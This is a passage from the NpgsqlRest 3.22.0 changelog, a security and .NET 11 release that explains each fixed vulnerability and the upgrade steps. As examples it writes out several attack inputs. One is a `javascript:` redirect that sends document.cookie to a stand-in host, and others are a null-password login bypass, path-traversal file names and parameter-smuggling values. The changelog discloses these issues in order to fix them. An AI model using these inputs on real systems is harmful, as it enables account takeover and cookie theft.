# Changelog v3.22.0

## Version [3.22.0](https://github.com/NpgsqlRest/NpgsqlRest/tree/3.22.0) (2026-11-11)

[Full Changelog](https://github.com/NpgsqlRest/NpgsqlRest/compare/3.21.0...3.22.0)

This release moves NpgsqlRest to **.NET 11** (the library and plugins also keep supporting .NET 10) and is a **security release**. A full review of the codebase found several vulnerabilities, including one critical issue in password login. **Everyone should upgrade.** Some security fixes change behavior that applications may rely on. Each is described below, with what to check before upgrading.

### Upgrade notes (read this first)

Most applications upgrade without changes. Go through this list; each item links to the full explanation.

**Platform**

- **.NET 10 and .NET 11.** The `NpgsqlRest` library and all plugin packages now target both `net10.0` (LTS) and `net11.0`, so applications on .NET 10 can take this release without changing framework. The `npgsqlrest` executable and Docker images are built with .NET 11 and are self-contained, so nothing changes for them.

**Changes that may need action**

- **Password login is stricter.** If your login function returns a password hash column, a login now always fails unless the password was actually checked against that hash. → [details](#login-no-longer-succeeds-without-a-verified-password)
- **Behind a reverse proxy or load balancer:** the client IP is no longer read from `X-Forwarded-For` and similar headers. Enable `ForwardedHeaders` (with `ForwardLimit: 1` and your proxy listed), or every user shares the proxy's IP in rate limits and audit data. → [details](#breaking-the-client-ip-address-is-no-longer-taken-from-request-headers)
- **`Antiforgery:Enabled: true`** now protects API endpoints: POST, PUT, PATCH and DELETE requests must send the antiforgery token. → [details](#breaking-antiforgeryenabled-now-actually-protects-api-endpoints)
- **`authorize` with user names or ids:** values are roles now. Use `user:<name>` or `id:<value>`, including SSE hints such as `format('authorize id:%s', _user_id)`. → [details](#breaking-authorize-values-are-roles-users-need-user-or-id)
- **`user_params` on endpoints anonymous users can call:** client-sent values for those parameters are ignored when the caller isn't signed in. → [details](#breaking-anonymous-callers-can-no-longer-fill-user-parameters-user_params)
- **`proxy` endpoints:** `Cookie`, `Authorization` and `Proxy-Authorization` are no longer forwarded upstream, and `Set-Cookie` is no longer passed back. Remove a header from `ProxyOptions:ExcludeHeaders` if an upstream really needs it. → [details](#breaking-the-reverse-proxy-no-longer-forwards-credentials-or-client-chosen-identity)
- **HTTP Custom Types:** request values are percent-encoded in the URL, and calls without `@timeout` time out after 30 seconds. → [details](#breaking-http-custom-types-encode-request-values-in-the-url-and-calls-time-out-after-30-seconds-by-default)
- **Login clients:** a wrong password now returns `401`, not `404`. → [details](#breaking-a-wrong-password-now-answers-like-an-unknown-user-401)
- **Upload `row_command` with `{placeholders}`:** placeholders are no longer substituted in that SQL. → [details](#breaking-no-placeholder-substitution-in-upload-row_command)
- **Passkeys:** frontends must send `userContext` back exactly as received, and multi-instance deployments need shared Data Protection keys. → [details](#passkeys-a-signed-in-user-could-add-their-passkey-to-someone-elses-account)
- **External login:** accounts whose email the provider reports as unverified are rejected. With Microsoft login, identify users by the stable `sub` id rather than by email. → [details](#external-login-unverified-email-addresses-are-rejected)
- **MCP from a browser page on the same named host** (e.g. `https://app.example.com` calling its own `/mcp`): add that origin to `McpOptions.AllowedOrigins`. → [details](#mcp-the-dns-rebinding-check-could-be-bypassed)

**Visible changes that normally need no action**

- Anonymous calls to `authorize` endpoints get `401` before validation runs, so they no longer see validation errors, `204` or `404` responses. → [details](#authorization-is-now-checked-before-the-request-is-processed)
- A `500` caused by the infrastructure (for example, the database is unreachable) no longer includes the error message. PostgreSQL's own errors still do. → [details](#infrastructure-error-details-are-no-longer-returned-to-clients)
- OpenAPI summaries and descriptions show only the prose lines of routine comments, not the annotations. → [details](#openapi-published-the-routines-annotations-including-credentials)
- The memory cache holds at most 100,000 entries by default (`CacheOptions:MemoryCacheMaxEntries`). → [details](#memory-cache-callers-could-grow-server-memory-without-limit)
- Multi-line SSE messages now arrive complete, as one event. → [details](#server-sent-events-forged-events-and-unbounded-memory-for-idle-subscribers)
- Static files inside dot-directories (such as `.git`) are no longer served; `.well-known` still is. → [details](#static-files-protected-pages-reachable-through-path-variants-git-served-unbounded-memory)
- New startup warnings point out risky settings. → [details](#new-startup-warnings-for-risky-configurations)

### .NET 11

- The `npgsqlrest` client, the tests and the benchmarks target `net11.0`. The core library and every plugin target **`net10.0` and `net11.0`**: .NET 10 is the long-term-support release (supported until November 2028), so library users on it get this release, including its security fixes, without changing framework. Everything compiles with C# 15.
- CI runs the full test suite twice: on .NET 11, and against the library's `net10.0` build on the .NET 10 runtime (`dotnet test NpgsqlRestTests -p:NpgsqlRestTestFramework=net10.0`).
- The JIT Docker image (`Dockerfile.jit`) uses the .NET 11 `aspnet` and `sdk` base images. The native AOT images are unchanged; they build a self-contained binary.
- CI builds, tests and publishes with the .NET 11 SDK (plus the .NET 10 runtime for the second test run). `global.json` pins SDK `11.0.100`.
- CI now also publishes the native AOT executable and serves real requests with it: GET and POST, rows, an anonymous call to an `authorize` endpoint, gzip, and 200 parallel requests (`.github/scripts/aot-smoke-test.sh`). This runs on every branch and before each release's Linux upload. A version check alone had missed an AOT build that crashed on its first request; see Runtime Async below.
- **Runtime Async is not enabled.** .NET 11 introduces Runtime Async (`<Features>runtime-async=on</Features>`), which replaces compiler-generated async state machines with runtime-managed suspension. NpgsqlRest was tested with it twice:
  - With the original request handler, one very large async method, it was harmful. The native AOT build of `npgsqlrest` crashed on the very first request, and every wait for I/O saved about 13.7 KB of state instead of one 0.8 KB object.
  - With the handler split into smaller methods (see [Performance](#performance)), both problems are gone. The AOT build serves requests normally, and the cost per request is ordinary. It is still slightly behind the build that ships: about 0.65 KB more allocated per request, at the same speed. The shipped build reuses the request's async state from a pool, and pooled methods don't use Runtime Async.

  So it stays off for now, and will be revisited as Runtime Async matures.

### Performance

Requests allocate much less memory, and on JIT deployments row-returning endpoints are about 10% faster. Two measurements, on the same machine and PostgreSQL in Docker. "Before" is 3.22.0 with the security fixes and without the performance work (`5befe76`), "after" is `9d63171`.

**JIT** (library users, the JIT Docker image, `dotnet run`). These are the endpoint benchmarks in `BenchmarkTests` (`dotnet run -c Release -- --endpoints`, BenchmarkDotNet). They send one request at a time to an in-process server. `GetText` returns one text value; `GetRows100` returns 100 rows of mixed column types. Allocations are per request, across client and server.

| | Before | After | Change |
|---|---:|---:|---:|
| `GetText` allocated | 7.28 KB | 5.71 KB | **−22%** |
| `GetRows100` allocated | 190.9 KB | 116.5 KB | **−39%** |
| `GetText` mean time | 202.2 µs | 185.0 µs | −8% |
| `GetRows100` mean time | 467.7 µs | 419.8 µs | **−10%** |

**Native AOT** (the `npgsqlrest` executable and AOT Docker images). These are the published binaries, loaded with ApacheBench over HTTP keep-alive, with the same two endpoints. Runs were interleaved, averages are shown:

| | Before | After | Change |
|---|---:|---:|---:|
| Text, one request at a time | 0.247 ms | 0.242 ms | −2% |
| 100 rows, one request at a time | 0.531 ms | 0.513 ms | −3% |
| 100 rows, 32 concurrent requests | 11,764 req/s | 12,120 req/s | within noise |
| Process memory after the load | 101–105 MB | 88–98 MB | lower |

The AOT executable gains less time, because it never had the first problem below: native AOT compiles every method with full optimizations ahead of time. The allocation savings come from the same code, so they apply to AOT as well. The concurrent run is limited by the single-threaded load tool, so it shows no throughput change either way.

- **JIT deployments: the request handler is now compiled with full optimizations.** Every request ran through one ~3,400-line async method, too large for the .NET JIT to optimize at run time (over 2,000 basic blocks), so the JIT left it unoptimized for the life of the process. That affected every JIT deployment: NuGet library users, the JIT Docker image, `dotnet run`. The native AOT executable was not affected. The method is now split into a request pipeline plus parameter binding (query string and JSON body) and result rendering (single command and multi-command). Each part reaches the JIT's optimized tier. The main method's IL shrank from 55 KB to 21 KB, and its machine code from 152 KB to 45 KB. This is most of the time saved on row-returning endpoints.
- **The string builder pool never reused the most recently returned builder.** NpgsqlRest pools the `StringBuilder`s it uses to build responses, but an off-by-one in the pool meant most requests got new builders. That was the largest allocation cost on row-returning endpoints. With it fixed, `GetRows100` allocates 38% less and needs about 60% fewer gen-1 collections.
- **Pooled async state.** The request handler and the new parts use .NET's pooling async method builder: the state of a request waiting for the database is reused across requests instead of allocated each time. That's about 0.8 KB less per request.
- **No DI scope per request.** The request handler declared an `IServiceProvider` parameter, so ASP.NET Core created and disposed a dependency-injection scope for every request. The route handler now takes only the `HttpContext` and the request's cancellation token, and the provider is taken from the request only in `ServiceProviderMode`. About 0.3 KB less per request. The handler is still bound at compile time by the Request Delegate Generator, so native AOT builds have no new warnings and the same size.
- **Responses are written straight to the response pipe** (`Response.BodyWriter`) instead of through an extra writer wrapped around the response stream, saving one more copy of every byte. About 0.35–0.45 KB less per request. Response compression and `proxy_out` work as before.
- **Retries allocate only on failure.** The command and connection retry helpers allocated a list for exceptions before the first attempt; now that happens on the first failure.

`NpgsqlRestEndpoint.InvokeAsync` keeps its public signature; its `IServiceProvider` parameter is now nullable, and when null it is taken from the request.

#### Login no longer succeeds without a verified password

**Severity: Critical.** Applies to endpoints marked with the `login` annotation whose function returns the password hash column (`hash` by default, set by `NpgsqlRest:AuthenticationOptions:HashColumnName`). This is the documented password-login pattern.

**What was wrong.** With this pattern, the login function returns the user's stored password hash, and NpgsqlRest checks the submitted password against it. But the check was silently **skipped**, and the user **signed in**, whenever:

- the client sent the password as JSON `null` (for example `{"username": "admin", "password": null}`);
- the password parameter has a default value in the function and the client left it out;
- the stored hash for that user is `NULL`, for example an account created through external login or passkeys that has no password;
- no function parameter name contains the configured text (`PasswordParameterNameContains`, default `"pass"`), so NpgsqlRest could not tell which parameter holds the password. Only a log warning was written;
- `PasswordHasher` was set to `null`.

In practice, anyone who knew a username could log in as that user, including administrators, by sending a null password.

**What changed.** When the login result contains the hash column, the password check is now mandatory. Each case above fails the login exactly like a wrong password: HTTP `404`, the configured `PasswordVerificationFailedCommand` runs (so failed-login tracking and lockouts see the attempt), and no one is signed in.

**What to check.** Correct applications are not affected: a valid username and password still logs in. If you have accounts without a password (a `NULL` hash) that previously logged in through this endpoint, that only worked because of this bug. Those accounts now need a password, or must use their external login or passkey.

#### Passkeys: a signed-in user could add their passkey to someone else's account

**Severity: High.** Applies to the `npgsqlrest` client with passkey authentication enabled (`Auth:PasskeyAuth:Enabled`).

**What was wrong.** Adding a passkey takes two requests. The "options" request returns a `userContext` object that the database produced (it identifies the account), and the browser sends that object back with the completion request. The server passed whatever came back straight to `CompleteAddExistingUserCommand` without checking it. The documented example SQL reads the target account from it (`_user_context->>'id'`), so a signed-in user could change the id and attach their own passkey to another account, such as an administrator's, then sign in as that user. New-user registration (`CompleteRegistrationCommand`) had the same weakness: the client could change any registration data in `userContext`.

**What changed.** The server now adds a sealed copy of the `userContext` it issues, in a `_protected` property, encrypted and signed with ASP.NET Core Data Protection. The seal is tied to the challenge. When a passkey is added to an existing account, it is also tied to the signed-in user. The completion endpoints reject a missing or invalid seal with `400 invalid_request` ("Invalid user context"), and the SQL command always receives the server's own copy, never the client's.

**What to check.**
- Frontends that send `userContext` back unchanged, as the documented examples do, keep working.
- A frontend that builds or edits `userContext` itself is rejected; send back exactly what the options endpoint returned.
- When running several instances, configure shared Data Protection keys (the `DataProtection` section). Without them, a challenge started on one instance cannot be completed on another, just like cookie authentication.

#### A request could run as the previous user (`user_context` on pooled connections)

**Severity: High.** Applies to endpoints using the `user_context` annotation, and to SQL that reads `current_setting('request.user_id')` or similar, for example row-level security policies.

**What was wrong.** `user_context` passes the caller's identity to PostgreSQL as session settings (`request.user_id`, `request.user_name`, `request.user_roles`, and the claims JSON key). Without a transaction, these are **session-level** settings: they stay on the database connection after the request ends. Two things combined into a leak:

- The `npgsqlrest` client always added `No Reset On Close=true` to the connection string, so Npgsql never cleared session state when a connection went back to the pool.
- For **anonymous** requests, the user keys were not set at all, so they kept whatever value was left on the connection.

As a result, an anonymous request that reused a connection last used by a signed-in user ran with that user's `request.user_id`, `request.user_name` and roles. Endpoints without `user_context` that read these settings (for example through RLS policies) could see the previous caller's identity too.

**What changed.**
- The `npgsqlrest` client no longer forces `No Reset On Close`. Npgsql resets the connection when it returns to the pool again, which clears all session settings. The reset is sent together with the next command, so it adds no extra round trip. You can still set `No Reset On Close=true` yourself in the connection string.
- For anonymous requests, `user_context` endpoints now set every user key, and the claims JSON key if configured, to NULL instead of skipping them. So `user_context` endpoints never see a previous identity, even when connections are not reset.
- At startup, the library warns when the connection string sets `No Reset On Close` while endpoints use `user_context` or `request_headers context` (unless `WrapInTransaction` is on).

**What to check.** Once a session has used a setting, PostgreSQL returns an **empty string**, not NULL, for it after it is cleared. This also happens after a connection reset. If your SQL casts the value, write `nullif(current_setting('request.user_id', true), '')::int` rather than `current_setting('request.user_id', true)::int`. The plain cast fails for anonymous requests on a reused connection.

#### Breaking: anonymous callers can no longer fill user parameters (`user_params`)

**Severity: High.** Applies to endpoints using the `user_params` annotation (or `UseUserParameters`) that anonymous users can call, meaning endpoints that do not require authorization.

**What was wrong.** With `user_params`, parameters such as `_user_id`, `_user_name`, `_user_roles` (configured in `ParameterNameClaimsMapping`) and `_user_claims` are meant to be filled by the server from the signed-in user's claims. Generated TypeScript and Dart clients, OpenAPI documents and MCP tool schemas all leave them out for that reason. For signed-in users the claim always won. For **anonymous** requests, though, the server filled nothing, and a value sent by the client was used as-is. A request such as `GET /api/orders?userId=1` on an endpoint open to anonymous users therefore ran as user 1, and a client could also send a forged `userClaims` JSON.

**What changed.** For anonymous requests, values the client sends for these parameters (in the query string or the JSON body) are now ignored. The function receives them as "not provided", so its default value is used, or NULL if there is none.

**What to check.** If an endpoint expected anonymous callers to pass one of these parameters on purpose, that no longer works. Rename the parameter so it is not claim-mapped, or require authentication.

#### File uploads could be written outside the upload directory

**Severity: High.** Applies to `upload for file_system` endpoints that keep the original file name (`unique_name = false`) or that build the upload `path` or `file` from request parameters (for example `path = {_path}`).

**What was wrong.** The upload directory and the file name were joined without any checks:
- The file name the browser sends with the upload can be anything, including `../../app/appsettings.json` or an absolute path. With `unique_name = false`, the file was written there, overwriting any file the server process could write to.
- An upload `path` or `file` built from request values could contain the same thing, even with unique names.

**What changed.**
- The client's file name is reduced to the bare name, with both `/` and `\` treated as separators: `../../etc/passwd` becomes `passwd`. The values `.` and `..` are refused.
- A `file` value must be a relative path without `..` segments. A `path` value must not contain `..` segments.
- The final location must be inside the upload directory.

A file that breaks these rules is not written. Its entry in the upload result has `"success": false`, `"status": "InvalidFileName"` and `"filePath": null`, just like files rejected for their type or content. Uploads with normal names are unaffected, and `filePath` is reported in the same form as before.

#### External login: `return_to` could run script or redirect to another site

**Severity: High.** Applies to the `npgsqlrest` client with external (OAuth) login enabled (`Auth:External`).

**What was wrong.** The external sign-in page (for example `/signin-google`) accepts a `return_to` query parameter, whose name is set by `ReturnToPathQueryStringKey`, and sends the browser there after the provider round trip. The value was used without any check:
- A link such as `/signin-google?return_to=javascript:fetch('//evil.example/?c='+document.cookie)` ran attacker-controlled script on your site's origin once the victim finished signing in, or even after they cancelled.
- `return_to=https://evil.example` turned your login page into an open redirect.

**What changed.** `return_to` must now be a path on the same site, such as `/dashboard?tab=2#top`. Absolute and protocol-relative URLs (`https://…`, `//…`, `/\…`), `javascript:` and other schemes, and values with control characters are ignored, and the user goes to the default page instead.

**What to check.** If you passed full URLs in `return_to`, pass a path instead.

#### A large stored value could crash the whole server

**Severity: High (availability).** Applies to all applications.

**What was wrong.** When writing certain values into a response, NpgsqlRest built the quoted value in a temporary buffer on the thread's stack, sized by the length of the value:
- every text and date value in CSV-style output (`raw` with `separator`);
- JSON values of types such as `varbit`, ranges, `interval`, `inet`, `geometry`.

A value of a few hundred thousand characters overflowed the stack. In .NET, a stack overflow cannot be caught: it ends the **entire process**, not just the request. Anyone able to store a long text (a comment, a description, an uploaded document) could take the server down, and it went down again every time that data was requested.

**What changed.** Only small values (up to 512 characters) still use a stack buffer. Larger values use a pooled heap buffer or are built directly. Responses are the same as before.

#### Breaking: the client IP address is no longer taken from request headers

**Severity: Medium.** Applies to anything that uses the client IP: the `IpAddress` rate-limiter partition (including the shipped `login_throttle` policy), the `_ip_address` parameter, the `request.ip_address` context value, `BeforeRoutineCommands` IP values, and passkey/OAuth analytics.

**What was wrong.** NpgsqlRest determined the client IP by reading the `X-Forwarded-For` header (its left-most entry), then `X-Real-IP`, `HTTP_X_FORWARDED_FOR` and `REMOTE_ADDR`, and used the real connection address only if none was present. Any client can send these headers. By sending a different `X-Forwarded-For` with each request, an attacker landed in a fresh rate-limit bucket every time, which made per-IP limits such as the login brute-force throttle useless. They could also write any IP they liked into audit data. Behind a proxy that appends to `X-Forwarded-For`, the left-most entry is still the one the attacker controls.

**What changed.** The client IP is now always `HttpContext.Connection.RemoteIpAddress`, the address of the connection itself.

**What to check: if you run behind a reverse proxy or load balancer,** the connection address is the proxy's address, so without further configuration every user shares one IP. Enable the forwarded headers middleware so the address reported by your proxy is used, ideally naming the proxy:

```json
{
  "ForwardedHeaders": {
    "Enabled": true,
    "ForwardLimit": 1,
    "KnownProxies": ["10.0.0.5"]
  }
}
```

With `ForwardLimit: 1`, only the entry added by your own proxy is used, and anything the client put in the header is ignored. Applications that use the NpgsqlRest library directly should call `app.UseForwardedHeaders(...)` with their proxies configured.

#### Breaking: `Antiforgery:Enabled` now actually protects API endpoints

**Severity: Medium.** Applies to the `npgsqlrest` client with `Antiforgery:Enabled: true`, and to library users who add antiforgery metadata to NpgsqlRest endpoints themselves.

**What was wrong.** The setting is documented as "Enable antiforgery token validation for state-changing requests", but no NpgsqlRest endpoint was ever validated:
- ASP.NET Core's antiforgery middleware only checks endpoints that carry antiforgery metadata, and NpgsqlRest endpoints had none.
- Even with the metadata, the middleware does not reject a request with a missing or wrong token. It only records the failure for the endpoint to act on, and NpgsqlRest never looked.

Enabling the setting produced tokens in parsed static pages, but every POST, PUT, PATCH and DELETE was accepted without one. Cross-site request forgery protection was therefore not in place.

**What changed.**
- With `Antiforgery:Enabled: true`, every NpgsqlRest endpoint requires an antiforgery token for POST, PUT, PATCH and DELETE. GET is unaffected.
- A request with a missing or invalid token is rejected with `400 Bad Request` ("Invalid or missing antiforgery token.") before anything runs. This check is in the library, so it also covers library users who add `RequireAntiforgeryTokenAttribute` metadata through `RouteHandlerCreated`.

**What to check.**
- Browser code must send the token, usually in the header named by `Antiforgery:HeaderName` (default `RequestVerificationToken`). Parsed static pages can embed it with the `{antiForgeryToken}` tag.
- Clients that authenticate only with bearer tokens or JWT are not exposed to CSRF, but now also need the token on state-changing requests. If your API serves only such clients, you can leave antiforgery disabled.

#### JWT: a refresh token was accepted as an access token

**Severity: Medium.** Applies to the `npgsqlrest` client with JWT authentication (`Auth:JwtAuth`, and `Jwt` entries in `Auth:Schemes`).

**What was wrong.** Access and refresh tokens are signed with the same key and carry the same issuer and audience. The only difference is a `token_type: refresh` claim, which nothing checked when a token arrived as `Authorization: Bearer`. A refresh token, valid for 7 days by default and meant only for the refresh endpoint, therefore worked as an access token on every API endpoint for its whole lifetime.

**What changed.** The JWT authentication handler rejects any token with `token_type: refresh`, and the request is treated as unauthenticated (`401`). Refresh tokens keep working at the refresh endpoint, and the access tokens it issues are unaffected.

#### Bearer-token refresh issued tokens for the wrong user

**Severity: Medium.** Applies to the `npgsqlrest` client with bearer-token authentication and a refresh path (`Auth:BearerTokenRefreshPath`, or `BearerTokenRefreshPath` in `Auth:Schemes`).

**What was wrong.** The refresh endpoint only checked that the refresh token had not expired. It then issued new tokens for whoever was **calling** it, meaning the user identified by the access token sent with the request, not the user the refresh token belongs to. As a result:
- Any valid access token, combined with *any* unexpired refresh token (for example the attacker's own), produced fresh tokens for the access token's owner. A stolen, short-lived access token could therefore be renewed indefinitely.
- Refreshing after the access token had expired, which is the normal reason to refresh, failed with `401`.

**What changed.** New tokens are issued for the user stored inside the refresh token, as ASP.NET Core Identity does. The refresh token is the credential, so no access token is needed. Clients that refresh after the access token has expired now get new tokens instead of a `401`.

#### External login: another site could sign a user into the attacker's account

**Severity: Medium.** Applies to the `npgsqlrest` client with external (OAuth) login enabled (`Auth:External`).

**What was wrong.** The OAuth `state` value protects the login against cross-site request forgery, but it was only compared in the sign-in page's browser script. The server redeemed any authorization `code` posted to the sign-in path. An attacker could start a login with their own Google or GitHub account, keep the code, and make a victim's browser post it from another site. The victim was then signed in to the **attacker's** account, and anything they entered (payment details, documents, messages) went into it. This is known as login CSRF.

**What changed.** The state is now also checked on the server:
- Starting the sign-in stores it in an HttpOnly, SameSite=Lax cookie, scoped to the sign-in path and valid for 10 minutes.
- When the code is posted, the state echoed by the provider must match that cookie, compared in constant time. The cookie is cleared afterwards.
- A missing or different state is rejected with `400` ("Invalid or expired sign-in state. Please start the sign-in again."), and the code is never sent to the provider.

The built-in sign-in page already sends the state, so nothing changes for users. A sign-in left open for more than 10 minutes has to be started again.

#### External login: unverified email addresses are rejected

**Severity: Medium.** Applies to the `npgsqlrest` client with external (OAuth) login enabled (`Auth:External`).

**What was wrong.** External login passes the provider's email address to your `LoginCommand` (`$2`), and login functions typically find the user by it. Some providers let an account carry an address its owner never proved they own, and say so with `"email_verified": false`. NpgsqlRest ignored that flag. Someone could register a provider account with a victim's address and sign in to the victim's account.

**What changed.**
- A login is rejected with `403` when the provider's user info reports the email as unverified (`email_verified` or Google's older `verified_email`, as a boolean or the string `"false"`). The user sees: "The email address of this Google account is not verified. Verify it with Google and sign in again." A warning is logged.
- Providers that only return verified addresses and send no flag (GitHub, Facebook, LinkedIn's email endpoint) are not affected.
- **Microsoft:** its user info has no such flag. The email of a work or school account is a directory attribute that the account's own tenant administrator can set to any address, including yours (the "nOAuth" issue). NpgsqlRest can't verify it, so when Microsoft login is enabled, a startup warning now says so. **Don't identify Microsoft users by email alone.** Use the stable subject id, `sub` in the user info JSON that your `LoginCommand` receives as `$4`, for example `($4::json)->>'sub'`.

#### Breaking: `authorize` values are roles; users need `user:` or `id:`

**Severity: Medium.** Applies to the `authorize` annotation with values, `sse_scope authorize ...`, and SSE `RAISE ... USING HINT = 'authorize ...'`.

**What was wrong.** A value in `authorize admin, editor` matched **three** claims: the role claim, the user **name** claim and the user **id** claim. That is how `authorize john` restricted an endpoint to user `john`. But the roles and the identities shared one namespace:
- If users can choose their own user name, someone who registered as `admin` passed `authorize admin`.
- A user name equal to someone else's user id passed `authorize <that id>`.

SSE had the same problem: an event with the hint `authorize admin` was also delivered to a user *named* `admin`.

**What changed.** Each value now says what it matches:

| Value | Matches | Example |
| --- | --- | --- |
| plain value | the role claim (`DefaultRoleClaimType`) only | `authorize admin, editor` |
| `user:<name>` | the user name claim (`DefaultNameClaimType`), case-insensitive | `authorize user:john` |
| `id:<id>` | the user id claim (`DefaultUserIdClaimType`), case-insensitive | `authorize id:42` |

The same rules apply to `sse_scope authorize ...` and to SSE hints. Also fixed: roles from an SSE hint were added to the endpoint's shared role list, so they piled up across events (later events reached recipients meant only for earlier ones) and the list was changed concurrently. Hint roles now apply to their own event only.

**What to check.**
- An `authorize` list naming specific users or ids must use the prefixes: `authorize john` becomes `authorize user:john`, and `authorize 42` becomes `authorize id:42`. Without the prefix, those users now get `403`, which fails safe.
- A plain numeric or GUID value logs a startup warning, because it is most likely a user id.
- Per-user SSE notifications written as `using hint = format('authorize %s', _user_id)` must become `format('authorize id:%s', _user_id)`, or the events no longer reach the user.

#### Basic Auth on overloaded routines applied to the wrong overload

**Severity: Medium.** Applies to endpoints using `basic_auth` where several routines share one path and differ by parameter count (overloads), and only some of them use `basic_auth`.

**What was wrong.** Basic Auth was checked for the path's primary endpoint, which is the routine registered last, before the request was matched to an overload by its parameters. So:
- an overload with `basic_auth` whose primary had none **ran without credentials**;
- public overloads of a `basic_auth` primary were asked for credentials they don't need.

**What changed.** Basic Auth runs for the routine the request actually resolves to. When every overload of a path uses Basic Auth (or the global `Auth:BasicAuth` option is on), it still runs first, before any request processing. Otherwise it runs as soon as the overload is known. Non-overloaded endpoints behave exactly as before.

#### Breaking: the reverse proxy no longer forwards credentials or client-chosen identity

**Severity: Medium.** Applies to endpoints using the `proxy` annotation (`NpgsqlRest:ProxyOptions`), and to HTTP Custom Types for the cookie part.

**What was wrong.**
- **The user's credentials went to the upstream.** All request headers except `Host`, `Content-Length` and `Transfer-Encoding` were forwarded, including the user's session `Cookie` and `Authorization` (JWT/bearer token), even when the upstream is a third-party service. The upstream's `Set-Cookie` headers were passed back too, so another service could set cookies on your application's origin.
- **Clients could choose the identity the upstream saw.** Server-filled values, meaning `user_params` parameters in the query string and `user_context` headers such as `request.user_id`, were **appended after** whatever the client sent under the same name: `?userId=<attacker>&userId=<real>`, or two `request.user_id` header values. For anonymous callers the client's value was the only one.
- **Upstream cookies were shared between users.** The proxy and HTTP Custom Types use one shared HTTP client, and it kept a cookie jar. A cookie that an upstream set during one user's request was stored and sent with every later upstream request, for every user.

**What changed.**
- `ExcludeHeaders` now also contains `Cookie`, `Authorization` and `Proxy-Authorization`, and `ExcludeResponseHeaders` contains `Set-Cookie`.
- Client query parameters and headers named like a server-filled value are removed before forwarding. The upstream only receives the server's values, and none at all when the server has none.
- The shared HTTP client no longer stores cookies.

**What to check.** If a proxied internal service relies on receiving the caller's bearer token, remove `"Authorization"` from `ExcludeHeaders`:

```json
{
  "NpgsqlRest": {
    "ProxyOptions": {
      "ExcludeHeaders": ["Host", "Content-Length", "Transfer-Encoding", "Cookie", "Proxy-Authorization"]
    }
  }
}
```

#### Response cache: different requests (and different users) could share a cached response

**Severity: Medium.** Applies to endpoints using the `cached` annotation, or cache profiles, with more than one cached parameter or with omitted parameters, and to cached `proxy` endpoints.

**What was wrong.** A cache key was built from the routine and the *values* of the cached parameters the request supplied, separated by an invisible character, without parameter names or lengths:
- Omitted parameters left no trace. For `f(_a default null, _b default null)` cached on both, `?a=x` and `?b=x` produced the same key, so one request received the other's cached result.
- A value could contain the separator itself (`%1F` in the query string), so `?a=x%1Fy` was the same key as `?a=x&b=y`.
- **Across users:** on a `user_params` endpoint, a signed-in user's id (from their claim) and an anonymous caller's own parameter with the same value produced the same key. The anonymous caller received the signed-in user's cached response.
- Cached proxy endpoints ignored query-string values that are not routine parameters (they are still forwarded to the upstream) and the request body, so `?page=1` and `?page=2` shared one cached upstream response.

**What changed.**
- Every cached parameter is written into the key with its name and the length of its value. NULL is marked separately from an empty string, and an omitted parameter is distinguishable.
- For proxy endpoints, the raw query string and the request body are part of the key too.

Existing cache entries no longer match after the upgrade and are simply recomputed. External caches (Redis, Hybrid) need no action.

#### Memory cache: callers could grow server memory without limit

**Severity: Medium.** Applies to endpoints using `cached` (or a cache profile) with the in-memory cache, which is the default cache type.

**What was wrong.** Cache keys contain request parameter values, so each distinct value a caller sent added an entry to the memory cache. Nothing limited the number of entries, and entries without an expiration were never removed. Sending many requests with different values (`?q=1`, `?q=2`, ...) grew server memory until the process ran out. Set-returning cached endpoints also kept a small lock object per distinct key forever.

The same lock had a second bug. A request cancelled while waiting for it still released it on the way out. That let two requests for the same key run concurrently, and later caused an error when the lock was released again.

**What changed.**
- New option **`CacheOptions:MemoryCacheMaxEntries`**, default `100000`. When the cache is full, responses for new keys are returned without being cached. Existing entries keep serving and expire normally, and updates to an existing key are always allowed. Set it to `0` for no limit.
- The per-key locks of set-returning endpoints exist only while requests hold or wait for them. A cancelled wait no longer releases a lock it never acquired.

```json
{
  "CacheOptions": {
    "MemoryCacheMaxEntries": 100000
  }
}
```

Redis and Hybrid caches are not affected; their memory is managed by Redis and HybridCache.

#### Breaking: HTTP Custom Types encode request values in the URL, and calls time out after 30 seconds by default

**Severity: Medium.** Applies to HTTP Custom Types (`HttpClientOptions:Enabled`) whose URL contains `{placeholders}` filled from request parameters, and to types without a `@timeout` directive.

**What was wrong.**
- Parameter values were inserted into the outbound URL as they were. A caller could change the request the server makes on their behalf. In `GET https://api.example.com/search?q={_q}&limit=5`, the value `x&limit=1000` added its own `limit`. In `GET https://api.example.com/users/{_id}/profile`, the value `../../admin?` walked the path to a different resource. The request still went out with the type's headers, such as an API key.
- A type without `@timeout` had no time limit, while the error messages claimed 30 seconds. A hanging upstream held the request, and its database connection, indefinitely.

**What changed.**
- In the URL, request-derived values (function parameters, including resolved parameters and the type's own fields) are percent-encoded, so each one stays inside its own path segment or query value. The target service decodes them back to the original value. Environment variable values are not encoded (they are operator configuration, such as a base URL). Header values and the request body are unchanged.
- Self-calls (relative URLs such as `GET /api/users/{_id}`) decode path values again, so the target endpoint receives the original value.
- Calls without `@timeout` now time out after 30 seconds: `status_code` is `408` and `error_message` is set.

**Do you need to do anything?** Only if one placeholder holds several URL parts at once, such as a whole query string (`?{_filters}`) or a sub-path with `/` (`/files/{_path}`). Those characters are now encoded. Split such values into one placeholder per value, or use an environment variable for parts that are configuration. Add `@timeout` to calls that legitimately take longer than 30 seconds.

#### Server-Sent Events: forged events, and unbounded memory for idle subscribers

**Severity: Medium.** Applies to endpoints that publish `RAISE` notices as Server-Sent Events (`sse`, `sse_publish`).

**What was wrong.**
- The notice message was written into the stream as-is. In SSE, a line break starts a new field, and an empty line ends the event. A message containing line breaks, such as `raise info 'New comment: %', _text` with user-written `_text`, could therefore:
  - add its own `event:`, `id:` or `retry:` fields;
  - end the event early and append a forged second event, delivered to every subscriber in scope.
- Each subscriber had an unlimited buffer of events waiting to be written. A client that connected and then stopped reading made the server keep every published event for it until the connection closed.

**What changed.**
- Each line of a message is now sent on its own `data:` line. This is how the SSE format carries multi-line data: the browser's `EventSource` joins the lines back with `\n`, so `event.data` is the original message. Multi-line messages previously arrived truncated, and now arrive whole. A `\r\n` line break arrives as `\n`.
- Each subscriber buffers at most 10,000 pending events. When a subscriber falls that far behind, its oldest pending events are dropped. Clients that keep reading are not affected.

The execution-id filter (`?<execution id>` on the subscribe URL) is unchanged. It narrows a stream to one execution's events; who may see an event is still decided by the event's scope (`matching`, `authorize`, `all`).

#### Validation: a crafted value could keep the server busy for minutes

**Severity: Medium.** Applies to endpoints using `validate ... using email`, or any custom rule of type `Regex`.

